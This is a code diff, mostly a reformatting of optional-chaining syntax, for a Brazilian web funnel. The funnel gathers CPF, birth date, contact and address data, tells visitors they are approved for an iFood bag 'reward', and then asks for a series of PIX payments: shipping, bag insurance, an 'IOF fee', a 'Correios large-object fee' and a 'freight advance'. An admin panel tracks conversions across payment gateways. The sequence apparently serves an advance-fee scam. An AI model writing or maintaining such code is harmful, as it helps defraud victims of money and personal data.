-        pixOrderTitle.textContent = String(pix ? .rewardName || reward.pixTitle || reward.name);
+        pixOrderTitle.textContent = String(pix?.rewardName || reward.pixTitle || reward.name);
     }
     if (reward && pixOrderImage) {
-        pixOrderImage.src = String(pix ? .rewardAsset || reward.asset);
-        pixOrderImage.alt = String(pix ? .rewardAlt || reward.pixAlt || reward.name);
+        pixOrderImage.src = String(pix?.rewardAsset || reward.asset);
+        pixOrderImage.alt = String(pix?.rewardAlt || reward.pixAlt || reward.name);
     }
     if (pixCode) pixCode.value = pix.paymentCode || '';
     if (pixIofCode) pixIofCode.value = pix.paymentCode || '';
@@ -3431,11 +3199,11 @@ function initPix() {
         const qrTargets = [pixQr, pixIofQr, pixCorreiosQr].filter(Boolean);
         if (!qrTargets.length) return;
         const qrSource = String(qrUrl || qrBase64 || '').trim();
-        const src = qrSource ?
-            ((/^https?:\/\//i.test(qrSource) || qrSource.startsWith('data:image')) ?
-                qrSource :
-                `data:image/png;base64,${qrSource}`) :
-            buildPixQrFallbackUrl(fallbackCode);
+        const src = qrSource
+            ? ((/^https?:\/\//i.test(qrSource) || qrSource.startsWith('data:image'))
+                ? qrSource
+                : `data:image/png;base64,${qrSource}`)
+            : buildPixQrFallbackUrl(fallbackCode);
         if (!src) return;
         qrTargets.forEach((img) => {
             img.src = src;
@@ -3443,9 +3211,9 @@ function initPix() {
     };
 
     const hasPixQrData = () => Boolean(
-        String(pix ? .paymentQrUrl || '').trim() ||
-        String(pix ? .paymentCodeBase64 || '').trim() ||
-        String(pix ? .paymentCode || '').trim()
+        String(pix?.paymentQrUrl || '').trim() ||
+        String(pix?.paymentCodeBase64 || '').trim() ||
+        String(pix?.paymentCode || '').trim()
     );
 
     const setPixQrSectionVisible = (visible) => {
@@ -3477,15 +3245,15 @@ function initPix() {
 
     const getPixAutoRetryBucketKey = () => {
         const sessionToken = sanitizePixAutoRetryToken(getLeadSessionId(), 'session');
-        const kindToken = isUpsellPix ?
-            sanitizePixAutoRetryToken(
-                pix ? .upsell ? .kind ||
-                pix ? .shippingId ||
-                pix ? .shippingName ||
+        const kindToken = isUpsellPix
+            ? sanitizePixAutoRetryToken(
+                pix?.upsell?.kind ||
+                pix?.shippingId ||
+                pix?.shippingName ||
                 'upsell',
                 'upsell'
-            ) :
-            'base';
+            )
+            : 'base';
         return `${sessionToken}:${kindToken}`;
     };
 
@@ -3512,23 +3280,16 @@ function initPix() {
         const map = loadPixAutoRetryMap();
         const bucket = map[key];
         if (!bucket || typeof bucket !== 'object' || Array.isArray(bucket)) {
-            return {
-                key,
-                map,
-                bucket: {
-                    total: 0,
-                    txids: {}
-                }
-            };
+            return { key, map, bucket: { total: 0, txids: {} } };
         }
         return {
             key,
             map,
             bucket: {
                 total: Number(bucket.total || 0) || 0,
-                txids: bucket.txids && typeof bucket.txids === 'object' && !Array.isArray(bucket.txids) ?
-                    bucket.txids :
-                    {}
+                txids: bucket.txids && typeof bucket.txids === 'object' && !Array.isArray(bucket.txids)
+                    ? bucket.txids
+                    : {}
             }
         };
     };
@@ -3536,9 +3297,7 @@ function initPix() {
     const canAutoRetryPixTxid = (txid = '') => {
         const cleanTxid = String(txid || '').trim();
         if (!cleanTxid) return false;
-        const {
-            bucket
-        } = getPixAutoRetryBucket();
+        const { bucket } = getPixAutoRetryBucket();
         if (bucket.total >= PIX_AUTO_RETRY_MAX) return false;
         return !bucket.txids[cleanTxid];
     };
@@ -3546,11 +3305,7 @@ function initPix() {
     const markAutoRetryPixTxid = (txid = '') => {
         const cleanTxid = String(txid || '').trim();
         if (!cleanTxid) return;
-        const {
-            key,
-            map,
-            bucket
-        } = getPixAutoRetryBucket();
+        const { key, map, bucket } = getPixAutoRetryBucket();
         map[key] = {
             total: bucket.total + 1,
             txids: {
@@ -3564,19 +3319,19 @@ function initPix() {
     const resolvePixRetryBumpPrice = () => {
         if (isUpsellPix) return 0;
         const bumpData = loadBump() || {};
-        const bumpSelected = bumpData ? .selected === true && Number(bumpData ? .price || 0) > 0;
+        const bumpSelected = bumpData?.selected === true && Number(bumpData?.price || 0) > 0;
         return bumpSelected ? Number(bumpData.price || 0) : 0;
     };
 
     const resolvePixRetryShipping = () => {
         if (isUpsellPix) {
-            const upsellPrice = Number(pix ? .upsell ? .price || 0) > 0 ?
-                Number(pix.upsell.price || 0) :
-                Math.max(0, Number((Number(pix ? .amount || 0) - rewardExtraPrice).toFixed(2)));
+            const upsellPrice = Number(pix?.upsell?.price || 0) > 0
+                ? Number(pix.upsell.price || 0)
+                : Math.max(0, Number((Number(pix?.amount || 0) - rewardExtraPrice).toFixed(2)));
             if (!Number.isFinite(upsellPrice) || upsellPrice <= 0) return null;
             return {
-                id: String(pix ? .shippingId || pix ? .upsell ? .kind || 'upsell_pix').trim() || 'upsell_pix',
-                name: String(pix ? .shippingName || pix ? .upsell ? .title || 'Pagamento via PIX').trim() || 'Pagamento via PIX',
+                id: String(pix?.shippingId || pix?.upsell?.kind || 'upsell_pix').trim() || 'upsell_pix',
+                name: String(pix?.shippingName || pix?.upsell?.title || 'Pagamento via PIX').trim() || 'Pagamento via PIX',
                 eta: '',
                 price: Number(upsellPrice.toFixed(2)),
                 basePrice: Number(upsellPrice.toFixed(2)),
@@ -3592,24 +3347,24 @@ function initPix() {
         const bumpPrice = resolvePixRetryBumpPrice();
         const fallbackShippingBase = Math.max(
             0,
-            Number((Number(pix ? .amount || 0) - bumpPrice - rewardExtraPrice).toFixed(2))
+            Number((Number(pix?.amount || 0) - bumpPrice - rewardExtraPrice).toFixed(2))
         );
         if (fallbackShippingBase <= 0) return null;
         const coupon = loadCoupon();
-        const amountOff = Number(coupon ? .amountOff || 0) || roundMoney(25.9 * Number(coupon ? .discount || 0));
-        const fallbackShippingOriginal = amountOff > 0 ?
-            Number((fallbackShippingBase + amountOff).toFixed(2)) :
-            fallbackShippingBase;
+        const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
+        const fallbackShippingOriginal = amountOff > 0
+            ? Number((fallbackShippingBase + amountOff).toFixed(2))
+            : fallbackShippingBase;
 
         return {
-            id: String(pix ? .shippingId || 'padrao').trim() || 'padrao',
-            name: String(pix ? .shippingName || 'Envio Padrao iFood').trim() || 'Envio Padrao iFood',
+            id: String(pix?.shippingId || 'padrao').trim() || 'padrao',
+            name: String(pix?.shippingName || 'Envio Padrao iFood').trim() || 'Envio Padrao iFood',
             eta: '',
             price: fallbackShippingBase,
             basePrice: fallbackShippingOriginal,
             originalPrice: fallbackShippingOriginal,
             selectedAt: Date.now(),
-            coupon: coupon ? .code,
+            coupon: coupon?.code,
             amountOff,
             discountApplied: amountOff > 0
         };
@@ -3617,25 +3372,23 @@ function initPix() {
 
     const resolvePixRetryOptions = (currentTxid = '') => {
         if (!isUpsellPix) {
-            return {
-                sourceStage: 'pix_auto_retry_refused'
-            };
+            return { sourceStage: 'pix_auto_retry_refused' };
         }
         return {
             sourceStage: 'pix_auto_retry_refused',
             upsell: {
                 enabled: true,
-                kind: String(pix ? .upsell ? .kind || pix ? .shippingId || 'upsell').trim() || 'upsell',
-                title: String(pix ? .upsell ? .title || pix ? .shippingName || 'Prioridade de envio').trim() || 'Prioridade de envio',
-                price: Number(pix ? .upsell ? .price || pix ? .amount || 0),
-                previousTxid: String(currentTxid || pix ? .upsell ? .previousTxid || '').trim(),
-                targetAfterPaid: String(pix ? .upsell ? .targetAfterPaid || '').trim()
+                kind: String(pix?.upsell?.kind || pix?.shippingId || 'upsell').trim() || 'upsell',
+                title: String(pix?.upsell?.title || pix?.shippingName || 'Prioridade de envio').trim() || 'Prioridade de envio',
+                price: Number(pix?.upsell?.price || pix?.amount || 0),
+                previousTxid: String(currentTxid || pix?.upsell?.previousTxid || '').trim(),
+                targetAfterPaid: String(pix?.upsell?.targetAfterPaid || '').trim()
             }
         };
     };
 
     const attemptAutoRegeneratePix = async (statusRaw = '') => {
-        const currentTxid = String(pix ? .idTransaction || '').trim();
+        const currentTxid = String(pix?.idTransaction || '').trim();
         if (!currentTxid || pixRegenerationBusy || !canAutoRetryPixTxid(currentTxid)) {
             return false;
         }
@@ -3674,7 +3427,7 @@ function initPix() {
             if (!statusPollTimer) {
                 statusPollTimer = setInterval(pollPixStatus, pollIntervalMs);
             }
-            showToast(error ? .message || 'Nao foi possivel gerar um novo PIX automaticamente.', 'error');
+            showToast(error?.message || 'Nao foi possivel gerar um novo PIX automaticamente.', 'error');
             return false;
         }
     };
@@ -3715,22 +3468,19 @@ function initPix() {
         }
     };
 
-    btnCopy ? .addEventListener('click', () => handleCopy(btnCopy, pixCode));
-    btnShowPixQr ? .addEventListener('click', () => {
+    btnCopy?.addEventListener('click', () => handleCopy(btnCopy, pixCode));
+    btnShowPixQr?.addEventListener('click', () => {
         if (!hasPixQrData()) return;
-        applyPixQrSource(pix ? .paymentQrUrl, pix ? .paymentCodeBase64, pix ? .paymentCode);
-        const shouldShow = pixQrSection ? .classList.contains('hidden');
+        applyPixQrSource(pix?.paymentQrUrl, pix?.paymentCodeBase64, pix?.paymentCode);
+        const shouldShow = pixQrSection?.classList.contains('hidden');
         setPixQrSectionVisible(!!shouldShow);
         if (shouldShow) {
-            pixQrSection ? .scrollIntoView({
-                behavior: 'smooth',
-                block: 'nearest'
-            });
+            pixQrSection?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
         }
     });
-    btnCopyIcon ? .addEventListener('click', () => handleCopy(btnCopyIcon, pixCode));
-    btnCopyIof ? .addEventListener('click', () => handleCopy(btnCopyIof, pixIofCode));
-    btnCopyCorreios ? .addEventListener('click', () => handleCopy(btnCopyCorreios, pixCorreiosCode));
+    btnCopyIcon?.addEventListener('click', () => handleCopy(btnCopyIcon, pixCode));
+    btnCopyIof?.addEventListener('click', () => handleCopy(btnCopyIof, pixIofCode));
+    btnCopyCorreios?.addEventListener('click', () => handleCopy(btnCopyCorreios, pixCorreiosCode));
 
     if (pixOrderId) {
         const id = String(pix.idTransaction || '').trim();
@@ -3801,7 +3551,7 @@ function initPix() {
             upsellPaid: isUpsellPix
         });
 
-        const txid = String(pix ? .idTransaction || '').trim();
+        const txid = String(pix?.idTransaction || '').trim();
         if (!txid || !sentPurchaseByTxid.has(txid)) {
             if (txid) sentPurchaseByTxid.add(txid);
             trackLead('pix_paid', {
@@ -3813,7 +3563,7 @@ function initPix() {
                     idTransaction: txid,
                     statusRaw: String(statusRaw || 'paid')
                 },
-                amount: Number(pix ? .amount || shipping ? .price || 0),
+                amount: Number(pix?.amount || shipping?.price || 0),
                 isUpsell: isUpsellPix
             });
         }
@@ -3821,23 +3571,23 @@ function initPix() {
         if (isUpsellPix) {
             const paidTarget = resolveUpsellPaidRedirect();
             const targetStage = resolveStageFromRedirect(paidTarget);
-            const redirectEvent = isIofUpsellPix ?
-                'upsell_iof_pix_paid_redirect' :
-                (isCorreiosUpsellPix ? 'upsell_correios_pix_paid_redirect' : 'upsell_pix_paid_redirect');
+            const redirectEvent = isIofUpsellPix
+                ? 'upsell_iof_pix_paid_redirect'
+                : (isCorreiosUpsellPix ? 'upsell_correios_pix_paid_redirect' : 'upsell_pix_paid_redirect');
             trackLead(redirectEvent, {
                 stage: 'pix',
                 shipping,
                 pix: {
-                    txid: pix ? .idTransaction || '',
+                    txid: pix?.idTransaction || '',
                     statusRaw: String(statusRaw || 'paid')
                 }
             });
             showToast(
-                isIofUpsellPix ?
-                'Pagamento confirmado. Seguindo para a taxa dos Correios.' :
-                (isCorreiosUpsellPix ?
-                    'Pagamento confirmado. Seguindo para o adiantamento do frete.' :
-                    'Pagamento confirmado. Prioridade ativada.'),
+                isIofUpsellPix
+                    ? 'Pagamento confirmado. Seguindo para a taxa dos Correios.'
+                    : (isCorreiosUpsellPix
+                        ? 'Pagamento confirmado. Seguindo para o adiantamento do frete.'
+                        : 'Pagamento confirmado. Prioridade ativada.'),
                 'success'
             );
             if (pixIofStatus) pixIofStatus.textContent = 'Status: Pagamento confirmado';
@@ -3853,7 +3603,7 @@ function initPix() {
             stage: 'pix',
             shipping,
             pix: {
-                txid: pix ? .idTransaction || '',
+                txid: pix?.idTransaction || '',
                 statusRaw: String(statusRaw || 'paid')
             }
         });
@@ -3878,9 +3628,7 @@ function initPix() {
         const send = async () => {
             const response = await fetch('/api/pix/status', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 credentials: 'same-origin',
                 body: JSON.stringify({
                     txid: pix.idTransaction,
@@ -3889,22 +3637,19 @@ function initPix() {
                 })
             });
             const body = await response.json().catch(() => ({}));
-            return {
-                response,
-                body
-            };
+            return { response, body };
         };
 
         let attempt = await send();
-        if (isBlockedApiPayload(attempt ? .response, attempt ? .body)) {
+        if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
             redirectToBlockedPage();
             return attempt;
         }
-        const firstError = String(attempt ? .body ? .error || '').trim();
+        const firstError = String(attempt?.body?.error || '').trim();
         if (!attempt.response.ok && (attempt.response.status === 401 || looksLikeSessionError(firstError))) {
             await ensureApiSession(true).catch(() => null);
             attempt = await send();
-            if (isBlockedApiPayload(attempt ? .response, attempt ? .body)) {
+            if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
                 redirectToBlockedPage();
                 return attempt;
             }
@@ -3915,23 +3660,20 @@ function initPix() {
 
     const pollPixStatus = async () => {
         if (pollingBusy || redirectedToUpsell) return;
-        if (!pix ? .idTransaction) return;
+        if (!pix?.idTransaction) return;
         pollingBusy = true;
 
         try {
-            const {
-                response: res,
-                body: data
-            } = await postPixStatusWithSessionRetry();
+            const { response: res, body: data } = await postPixStatusWithSessionRetry();
             if (!res.ok) return;
 
-            const nextPaymentCode = String(data ? .paymentCode || '').trim();
-            const nextPaymentQrUrl = String(data ? .paymentQrUrl || '').trim();
-            const nextPaymentCodeBase64 = String(data ? .paymentCodeBase64 || '').trim();
+            const nextPaymentCode = String(data?.paymentCode || '').trim();
+            const nextPaymentQrUrl = String(data?.paymentQrUrl || '').trim();
+            const nextPaymentCodeBase64 = String(data?.paymentCodeBase64 || '').trim();
             const shouldUpdatePix =
-                (!String(pix ? .paymentCode || '').trim() && !!nextPaymentCode) ||
-                (!String(pix ? .paymentQrUrl || '').trim() && !!nextPaymentQrUrl) ||
-                (!String(pix ? .paymentCodeBase64 || '').trim() && !!nextPaymentCodeBase64);
+                (!String(pix?.paymentCode || '').trim() && !!nextPaymentCode) ||
+                (!String(pix?.paymentQrUrl || '').trim() && !!nextPaymentQrUrl) ||
+                (!String(pix?.paymentCodeBase64 || '').trim() && !!nextPaymentCodeBase64);
             if (shouldUpdatePix) {
                 if (nextPaymentCode && pixCode && !String(pixCode.value || '').trim()) {
                     pixCode.value = nextPaymentCode;
@@ -3954,8 +3696,8 @@ function initPix() {
                 syncPixQrButtonState();
             }
 
-            const status = normalizePixStatus(data ? .status);
-            const statusRawText = String(data ? .statusRaw || data ? .status || '').trim();
+            const status = normalizePixStatus(data?.status);
+            const statusRawText = String(data?.statusRaw || data?.status || '').trim();
             if (pixIofStatus) {
                 if (status === 'paid') {
                     pixIofStatus.textContent = 'Status: Pagamento confirmado';
@@ -3975,7 +3717,7 @@ function initPix() {
                 }
             }
             if (status === 'paid') {
-                markPaidAndRedirect(data ? .statusRaw);
+                markPaidAndRedirect(data?.statusRaw);
                 return;
             }
 
@@ -3997,12 +3739,12 @@ function initPix() {
         }
     };
 
-    if (pix ? .paidAt) {
-        markPaidAndRedirect(pix ? .statusRaw || pix ? .status || 'paid');
+    if (pix?.paidAt) {
+        markPaidAndRedirect(pix?.statusRaw || pix?.status || 'paid');
         return;
     }
 
-    const missingPixVisualData = !String(pix ? .paymentCode || '').trim() && !String(pix ? .paymentQrUrl || pix ? .paymentCodeBase64 || '').trim();
+    const missingPixVisualData = !String(pix?.paymentCode || '').trim() && !String(pix?.paymentQrUrl || pix?.paymentCodeBase64 || '').trim();
     const pollIntervalMs = missingPixVisualData ? 2500 : 5000;
 
     ensureApiSession()
@@ -4011,12 +3753,8 @@ function initPix() {
             pollPixStatus();
             statusPollTimer = setInterval(pollPixStatus, pollIntervalMs);
         });
-    window.addEventListener('pagehide', clearStatusPolling, {
-        once: true
-    });
-    window.addEventListener('beforeunload', clearStatusPolling, {
-        once: true
-    });
+    window.addEventListener('pagehide', clearStatusPolling, { once: true });
+    window.addEventListener('beforeunload', clearStatusPolling, { once: true });
 }
 
 function toRootRelativePath(rawUrl = '') {
@@ -4041,17 +3779,17 @@ function resolvePaidPixTarget(pix) {
     const pixData = pix && typeof pix === 'object' ? pix : null;
     if (!pixData || !isPixPaid(pixData)) return '';
 
-    const explicitTarget = String(pixData ? .upsell ? .targetAfterPaid || '').trim();
+    const explicitTarget = String(pixData?.upsell?.targetAfterPaid || '').trim();
     if (explicitTarget) return explicitTarget;
 
-    const isUpsellPix = Boolean(pixData ? .isUpsell || pixData ? .upsell ? .enabled);
+    const isUpsellPix = Boolean(pixData?.isUpsell || pixData?.upsell?.enabled);
     if (!isUpsellPix) return 'upsell-iof.html';
 
-    const kind = String(pixData ? .upsell ? .kind || '').trim().toLowerCase();
+    const kind = String(pixData?.upsell?.kind || '').trim().toLowerCase();
     const hints = [
-        String(pixData ? .shippingId || '').trim().toLowerCase(),
-        String(pixData ? .shippingName || '').trim().toLowerCase(),
-        String(pixData ? .upsell ? .title || '').trim().toLowerCase()
+        String(pixData?.shippingId || '').trim().toLowerCase(),
+        String(pixData?.shippingName || '').trim().toLowerCase(),
+        String(pixData?.upsell?.title || '').trim().toLowerCase()
     ].join(' ');
     if (/iof/.test(kind) || /iof/.test(hints)) return 'upsell-correios.html';
     if (/correios|objeto_grande|objeto grande/.test(kind) || /correios|objeto_grande|objeto grande/.test(hints)) return 'upsell.html';
@@ -4073,7 +3811,7 @@ function buildBackRedirectUrl(pageOverride) {
         return withDirectMode('processando.html');
     };
 
-    const page = pageOverride || document.body ? .dataset ? .page || '';
+    const page = pageOverride || document.body?.dataset?.page || '';
     const personal = loadPersonal();
     const address = loadAddress();
     const shipping = loadShipping();
@@ -4081,11 +3819,11 @@ function buildBackRedirectUrl(pageOverride) {
     const pixPaid = isPixPaid(pix);
     const pixPending = !!pix && !pixPaid;
     const hasPersonalCore = !!(
-        personal ? .name &&
-        personal ? .cpf &&
-        personal ? .birth &&
-        personal ? .email &&
-        personal ? .phone
+        personal?.name &&
+        personal?.cpf &&
+        personal?.birth &&
+        personal?.email &&
+        personal?.phone
     );
     const hasAddress = !!address;
     const hasShipping = !!shipping;
@@ -4159,7 +3897,7 @@ function normalizeBackRedirectPath(rawUrl) {
 
 function buildBackRedirectFallbackUrl(pageOverride) {
     const params = new URLSearchParams(window.location.search || '');
-    const page = pageOverride || document.body ? .dataset ? .page || '';
+    const page = pageOverride || document.body?.dataset?.page || '';
     const withParams = (basePath, mutateFn) => {
         const qp = new URLSearchParams(params.toString());
         if (typeof mutateFn === 'function') mutateFn(qp);
@@ -4471,51 +4209,11 @@ function initAdmin() {
     let loadingLeads = false;
     let loadingGatewayOrderDailyStats = false;
     const emptyGatewayStats = () => ({
-        ghostspay: {
-            leads: 0,
-            pix: 0,
-            paid: 0,
-            refunded: 0,
-            refused: 0,
-            pending: 0,
-            conversion: 0
-        },
-        sunize: {
-            leads: 0,
-            pix: 0,
-            paid: 0,
-            refunded: 0,
-            refused: 0,
-            pending: 0,
-            conversion: 0
-        },
-        paradise: {
-            leads: 0,
-            pix: 0,
-            paid: 0,
-            refunded: 0,
-            refused: 0,
-            pending: 0,
-            conversion: 0
-        },
-        atomopay: {
-            leads: 0,
-            pix: 0,
-            paid: 0,
-            refunded: 0,
-            refused: 0,
-            pending: 0,
-            conversion: 0
-        },
-        bravopay: {
-            leads: 0,
-            pix: 0,
-            paid: 0,
-            refunded: 0,
-            refused: 0,
-            pending: 0,
-            conversion: 0
-        }
+        ghostspay: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 },
+        sunize: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 },
+        paradise: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 },
+        atomopay: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 },
+        bravopay: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0, conversion: 0 }
     });
     const metrics = {
         total: 0,
@@ -4529,60 +4227,20 @@ function initAdmin() {
     };
     let gatewayOrderDailyStats = emptyGatewayStats();
     const funnelPageMeta = {
-        home: {
-            label: 'index.html',
-            desc: 'Pagina inicial (entrada do funil)'
-        },
-        quiz: {
-            label: 'quiz.html',
-            desc: 'Perguntas de qualificacao'
-        },
-        personal: {
-            label: 'dados.html',
-            desc: 'Coleta de dados pessoais'
-        },
-        cep: {
-            label: 'endereco.html',
-            desc: 'Consulta e confirmacao de CEP'
-        },
-        processing: {
-            label: 'processando.html',
-            desc: 'Video + verificacao de elegibilidade'
-        },
-        success: {
-            label: 'sucesso.html',
-            desc: 'Aprovado e chamada para resgate'
-        },
-        checkout: {
-            label: 'checkout.html',
-            desc: 'Endereco e selecao de frete'
-        },
-        orderbump: {
-            label: 'orderbump.html',
-            desc: 'Oferta do Seguro Bag'
-        },
-        pix: {
-            label: 'pix.html',
-            desc: 'Pagamento via PIX'
-        },
-        'upsell-iof': {
-            label: 'upsell-iof.html',
-            desc: 'Upsell 1: taxa de IOF da bag'
-        },
-        'upsell-correios': {
-            label: 'upsell-correios.html',
-            desc: 'Upsell 2: taxa de objeto grande dos Correios'
-        },
-        upsell: {
-            label: 'upsell.html',
-            desc: 'Upsell 3: adiantamento do frete'
-        }
+        home: { label: 'index.html', desc: 'Pagina inicial (entrada do funil)' },
+        quiz: { label: 'quiz.html', desc: 'Perguntas de qualificacao' },
+        personal: { label: 'dados.html', desc: 'Coleta de dados pessoais' },
+        cep: { label: 'endereco.html', desc: 'Consulta e confirmacao de CEP' },
+        processing: { label: 'processando.html', desc: 'Video + verificacao de elegibilidade' },
+        success: { label: 'sucesso.html', desc: 'Aprovado e chamada para resgate' },
+        checkout: { label: 'checkout.html', desc: 'Endereco e selecao de frete' },
+        orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Bag' },
+        pix: { label: 'pix.html', desc: 'Pagamento via PIX' },
+        'upsell-iof': { label: 'upsell-iof.html', desc: 'Upsell 1: taxa de IOF da bag' },
+        'upsell-correios': { label: 'upsell-correios.html', desc: 'Upsell 2: taxa de objeto grande dos Correios' },
+        upsell: { label: 'upsell.html', desc: 'Upsell 3: adiantamento do frete' }
     };
-    let overviewRange = {
-        preset: 'all',
-        from: '',
-        to: ''
-    };
+    let overviewRange = { preset: 'all', from: '', to: '' };
     let currentSettings = null;
     let currentSettingsLoaded = false;
     let currentSettingsStatus = 'idle';
@@ -4631,22 +4289,18 @@ function initAdmin() {
         templateGrid.style.gridTemplateColumns = 'repeat(auto-fit, minmax(260px, 1fr))';
         templateGrid.style.gap = '12px';
 
-        const ensureField = ({
-            id,
-            label,
-            isTextarea = false
-        }) => {
+        const ensureField = ({ id, label, isTextarea = false }) => {
             let input = document.getElementById(id);
-            let group = input ? .closest('.input-group') || null;
+            let group = input?.closest('.input-group') || null;
 
             if (!input) {
                 group = document.createElement('div');
                 group.className = 'input-group';
                 input = isTextarea ? document.createElement('textarea') : document.createElement('input');
                 input.id = id;
-                input.className = isTextarea ?
-                    'floating-input floating-input--textarea' :
-                    'floating-input';
+                input.className = isTextarea
+                    ? 'floating-input floating-input--textarea'
+                    : 'floating-input';
                 input.placeholder = ' ';
                 if (!isTextarea) {
                     input.type = 'text';
@@ -4802,12 +4456,12 @@ function initAdmin() {
     const gatewayOrderKeys = ['ghostspay', 'sunize', 'paradise', 'atomopay', 'bravopay'];
 
     const normalizeGatewayOrderForUi = (value, fallback = 'ghostspay') => {
-        const rawList = Array.isArray(value) ?
-            value :
-            String(value || '')
-            .split(',')
-            .map((item) => item.trim())
-            .filter(Boolean);
+        const rawList = Array.isArray(value)
+            ? value
+            : String(value || '')
+                .split(',')
+                .map((item) => item.trim())
+                .filter(Boolean);
         const order = [];
         rawList.forEach((item) => {
             const normalized = normalizeGatewayKey(item);
@@ -4819,18 +4473,18 @@ function initAdmin() {
         return [...new Set([...order, fallbackGateway, ...gatewayOrderKeys])];
     };
 
-    const getGatewayOrderItems = () => Array.from(paymentsGatewayOrder ? .querySelectorAll('[data-gateway-order-item]') || []);
+    const getGatewayOrderItems = () => Array.from(paymentsGatewayOrder?.querySelectorAll('[data-gateway-order-item]') || []);
 
     const getGatewayOrderFromUi = () => {
         const fromDom = getGatewayOrderItems()
             .map((item) => normalizeGatewayKey(item.getAttribute('data-gateway-order-item')))
             .filter((gateway) => gatewayOrderKeys.includes(gateway));
-        return normalizeGatewayOrderForUi(fromDom, paymentsActiveGateway ? .value || currentSettings ? .payments ? .activeGateway || 'ghostspay');
+        return normalizeGatewayOrderForUi(fromDom, paymentsActiveGateway?.value || currentSettings?.payments?.activeGateway || 'ghostspay');
     };
 
     const getPrimaryGatewayFromUi = () => {
         const order = getGatewayOrderFromUi();
-        return normalizeGatewayKey(order[0] || paymentsActiveGateway ? .value || 'ghostspay');
+        return normalizeGatewayKey(order[0] || paymentsActiveGateway?.value || 'ghostspay');
     };
 
     const getGatewayEnabledInput = (gateway) => {
@@ -4845,7 +4499,7 @@ function initAdmin() {
 
     const getCurrentGatewaySettings = (gateway) => {
         const normalized = normalizeGatewayKey(gateway);
-        return currentSettings ? .payments ? .gateways ? .[normalized] || {};
+        return currentSettings?.payments?.gateways?.[normalized] || {};
     };
 
     const readCheckboxSetting = (input, currentValue = false) => (
@@ -4866,32 +4520,22 @@ function initAdmin() {
     const normalizeGatewayStatsMap = (source = {}) => {
         const base = emptyGatewayStats();
         return {
-            ghostspay: { ...base.ghostspay,
-                ...(source.ghostspay || {})
-            },
-            sunize: { ...base.sunize,
-                ...(source.sunize || {})
-            },
-            paradise: { ...base.paradise,
-                ...(source.paradise || {})
-            },
-            atomopay: { ...base.atomopay,
-                ...(source.atomopay || {})
-            },
-            bravopay: { ...base.bravopay,
-                ...(source.bravopay || {})
-            }
+            ghostspay: { ...base.ghostspay, ...(source.ghostspay || {}) },
+            sunize: { ...base.sunize, ...(source.sunize || {}) },
+            paradise: { ...base.paradise, ...(source.paradise || {}) },
+            atomopay: { ...base.atomopay, ...(source.atomopay || {}) },
+            bravopay: { ...base.bravopay, ...(source.bravopay || {}) }
         };
     };
 
     const getGatewayMetricsForUi = (gateway) => {
         const normalized = normalizeGatewayKey(gateway);
-        const stats = gatewayOrderDailyStats ? .[normalized] || {};
+        const stats = gatewayOrderDailyStats?.[normalized] || {};
         const generated = Number(stats.pix || 0);
         const paid = Number(stats.paid || 0);
-        const conversionRaw = Number.isFinite(Number(stats.conversion)) ?
-            Number(stats.conversion) :
-            (generated > 0 ? (paid / generated) * 100 : 0);
+        const conversionRaw = Number.isFinite(Number(stats.conversion))
+            ? Number(stats.conversion)
+            : (generated > 0 ? (paid / generated) * 100 : 0);
         const conversion = Math.max(0, Math.min(100, Number(conversionRaw || 0)));
         return {
             generated,
@@ -4901,7 +4545,7 @@ function initAdmin() {
     };
 
     const setGatewayOrderMetricText = (selector, gateway, value) => {
-        const node = paymentsGatewayOrder ? .querySelector ? .(`[${selector}="${gateway}"]`);
+        const node = paymentsGatewayOrder?.querySelector?.(`[${selector}="${gateway}"]`);
         if (node) node.textContent = String(value);
     };
 
@@ -4943,7 +4587,7 @@ function initAdmin() {
             const res = await adminFetch(url.toString());
             if (!res.ok) return;
             const data = await res.json().catch(() => ({}));
-            gatewayOrderDailyStats = normalizeGatewayStatsMap(data ? .summary ? .gatewayStats || {});
+            gatewayOrderDailyStats = normalizeGatewayStatsMap(data?.summary?.gatewayStats || {});
             syncGatewayOrderStats();
         } catch (_error) {
             // Keep the last rendered values if the daily summary request fails.
@@ -4988,7 +4632,7 @@ function initAdmin() {
             }
             return;
         }
-        const normalized = normalizeGatewayOrderForUi(order, paymentsActiveGateway ? .value || 'ghostspay');
+        const normalized = normalizeGatewayOrderForUi(order, paymentsActiveGateway?.value || 'ghostspay');
         normalized.forEach((gateway) => {
             const item = paymentsGatewayOrder.querySelector(`[data-gateway-order-item="${gateway}"]`);
             if (item) paymentsGatewayOrder.appendChild(item);
@@ -5002,22 +4646,16 @@ function initAdmin() {
             const box = child.getBoundingClientRect();
             const offset = y - box.top - box.height / 2;
             if (offset < 0 && offset > closest.offset) {
-                return {
-                    offset,
-                    element: child
-                };
+                return { offset, element: child };
             }
             return closest;
-        }, {
-            offset: Number.NEGATIVE_INFINITY,
-            element: null
-        }).element;
+        }, { offset: Number.NEGATIVE_INFINITY, element: null }).element;
     };
 
     const initializeGatewayOrderControls = () => {
         if (!paymentsGatewayOrder) return;
         paymentsGatewayOrder.addEventListener('dragstart', (event) => {
-            const item = event.target ? .closest ? .('[data-gateway-order-item]');
+            const item = event.target?.closest?.('[data-gateway-order-item]');
             if (!item) return;
             event.dataTransfer.effectAllowed = 'move';
             event.dataTransfer.setData('text/plain', item.getAttribute('data-gateway-order-item') || '');
@@ -5044,7 +4682,7 @@ function initAdmin() {
             syncGatewayOrderMeta();
         });
         paymentsGatewayOrder.addEventListener('click', (event) => {
-            const button = event.target ? .closest ? .('[data-gateway-order-move]');
+            const button = event.target?.closest?.('[data-gateway-order-move]');
             if (!button || button.disabled) return;
             const item = button.closest('[data-gateway-order-item]');
             if (!item) return;
@@ -5077,7 +4715,7 @@ function initAdmin() {
             label.classList.remove('is-on');
             return;
         }
-        const enabled = !!input ? .checked;
+        const enabled = !!input?.checked;
